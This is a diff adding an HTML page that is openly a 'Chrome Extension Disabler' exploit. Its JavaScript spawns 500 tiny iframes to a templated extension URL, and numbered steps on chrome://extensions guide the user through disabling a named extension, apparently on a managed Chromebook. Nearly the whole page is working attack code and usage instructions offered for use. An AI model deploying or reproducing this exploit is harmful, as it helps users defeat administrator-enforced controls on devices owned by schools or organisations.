@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>LTMEAT on generic webpages</title>
+    <script>
+      let public_url = `{{public_url}}`;
+
+      function create_iframes() {
+        let iframes = []
+        for (let i=0; i<500; i++) {
+          let iframe = document.createElement("iframe");
+          iframe.src = public_url;
+          iframe.style.width = iframe.style.height = "1px";
+          iframes.push(iframe);
+          document.body.append(iframe);
+        }
+      }
+    </script>
+  </head>
+  <body>
+    <h1>Simple Chrome Extension Disabler</h1>
+    <h2>Instructions</h2>
+    <ol>
+      <li>Open chrome://extensions</li>
+      <li>Go to the settings page for this extension: {{extension_name}}</li>
+      <li>Click the "create iframes" button.</li>
+      <li>Back on the chrome://extensions page, click the "allow access to file URLs" switch</li>
+      <li>Go back to this page and click the "create iframes" button a few times.</li>
+      <li>The extension should now be disabled.</li>
+    </ol>
+    <p>During this process, your Chromebook may freeze momentarily. This is normal, and it should resolve itself after a few seconds.</p>
+    <button onclick="create_iframes()">create iframes</button>
+    <hr>
+    <details>
+      <summary>
+        Made by <a href="https://ading.dev">ading2210</a>. This file is licensed under the MIT license.
+      </summary>
+      <pre>MIT License
+Copyright (c) 2023 ading2210
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.</pre>
+    </details>
+  </body>
+</html>
